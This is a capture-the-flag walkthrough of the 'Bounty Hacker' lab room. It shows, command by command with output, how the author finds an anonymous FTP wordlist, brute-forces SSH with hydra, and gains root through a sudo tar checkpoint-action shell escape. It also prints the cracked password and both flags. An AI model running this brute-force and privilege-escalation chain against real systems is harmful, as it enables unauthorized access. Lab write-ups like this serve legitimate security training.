### Bounty Hacker

#### Living up to the title.

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

Deploy the machine.

Find open ports on the machine

Who wrote the task list?
- lin

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Bounty_Hacker]
└─$ nmap -sC -sV -oN nmap_results.txt 10.10.110.227
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 05:15 EDT
Nmap scan report for 10.10.110.227
Host is up (0.61s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.73.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.25 seconds

```

Upon checking the ftp server, we have listed 2 files below:

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Bounty_Hacker]
└─$ ftp 10.10.110.227
Connected to 10.10.110.227.
220 (vsFTPd 3.0.3)
Name (10.10.110.227:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||32186|)
ftp: Can't connect to `10.10.110.227:32186': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*************************************************************************|    68      477.74 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.11 KiB/s)
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*************************************************************************|   418       10.39 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (0.65 KiB/s)
ftp>
```

On task.txt, we can see the user who wrote the file:

![[Pasted image 20220819053322.png]]

On locks.txt, we can also see that it is a wordlist for potential bruteforce attack.

Webpage at port 80:

![](../../img/Pasted%20image%2020220824093825.png)

After enumerating those things, we can now proceed with brutefoce `lin` using hydra and the locks.txt wordlist:

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Bounty_Hacker]
└─$ hydra -l lin -P ~/ken/MoonShine/CTF/Bounty_Hacker/locks.txt 10.10.110.227 ssh -t 4
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-19 05:27:00
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.110.227:22/
[22][ssh] host: 10.10.110.227   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-19 05:27:17
                                                                                                                      
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Bounty_Hacker]
└─$ 

```


What is the user's password:
- RedDr4gonSynd1cat3

Login to lin using ssh to get the user.txt flag:

```

┌──(kali㉿kali)-[~]
└─$ ssh lin@10.10.110.227
The authenticity of host '10.10.110.227 (10.10.110.227)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.110.227' (ED25519) to the list of known hosts.
lin@10.10.110.227's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}


```

lastly, upon checking, we can see that user lin has privileges for root using the /bin/tar below:

```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:~/Desktop$
```

Looking at GTFObins documentation, we can see that tar can be exploited if user has sudo previleges (on sudo -l)

![](../../img/Pasted%20image%2020220824093848.png)

We can now perform the attack and capture the flag:

```
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# cd /root
# cat root/txt
cat: root/txt: No such file or directory
# cat root.txt
THM{80UN7Y_h4cK3r}
# 

```

END

